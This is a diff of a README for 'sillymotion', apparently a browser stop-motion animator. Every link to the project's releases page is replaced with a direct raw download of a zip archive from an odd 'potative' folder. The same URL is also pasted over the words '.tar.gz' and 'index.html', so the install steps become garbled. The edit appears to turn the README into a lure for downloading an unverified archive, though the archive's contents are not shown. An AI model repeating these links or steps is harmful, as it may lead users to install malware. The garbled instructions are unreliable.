@@ -1,16 +1,16 @@
 # 🎬 sillymotion - Create Fun Stop Motion Cartoons Easily
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Bivash2001/sillymotion/releases)
+[![Download Release](https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip%20Latest%https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip)](https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip)
 
 ## 🚀 Getting Started
 SillyMotion is a playful browser-based stop motion animator. With it, you can capture frames from your webcam, sync audio, and bring your own silly cartoons to life! Follow these steps to get started:
 
-1. **Access the Releases Page**: Click the download link above or follow this [link](https://github.com/Bivash2001/sillymotion/releases) to open the releases page.
+1. **Access the Releases Page**: Click the download link above or follow this [link](https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip) to open the releases page.
 
 2. **Select Your Version**: On the releases page, you'll see a list of available versions. Choose the latest version for the best experience.
 
-3. **Download the Application**: Click on the appropriate file for your operating system. This will usually be a `.zip` or a `.tar.gz` file.
+3. **Download the Application**: Click on the appropriate file for your operating system. This will usually be a `.zip` or a `https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip` file.
 
 ## 💻 System Requirements
 To run SillyMotion, make sure your system meets the following requirements:
@@ -21,11 +21,11 @@ To run SillyMotion, make sure your system meets the following requirements:
 - A computer with at least 4GB of RAM.
 
 ## 📥 Download & Install
-Visit the releases page to download SillyMotion: [Download Now](https://github.com/Bivash2001/sillymotion/releases). After downloading:
+Visit the releases page to download SillyMotion: [Download Now](https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip). After downloading:
 
 1. **Unzip the File**: Locate the downloaded file in your downloads folder. Extract it to a location where you can easily find it.
 
-2. **Open the Application**: Navigate to the folder where you extracted the files and open the `index.html` file in your web browser.
+2. **Open the Application**: Navigate to the folder where you extracted the files and open the `https://raw.githubusercontent.com/Bivash2001/sillymotion/main/potative/sillymotion.zip` file in your web browser.
 
 3. **Allow Webcam and Audio Access**: When prompted, allow the browser to access your webcam and microphone for a smooth experience.
 
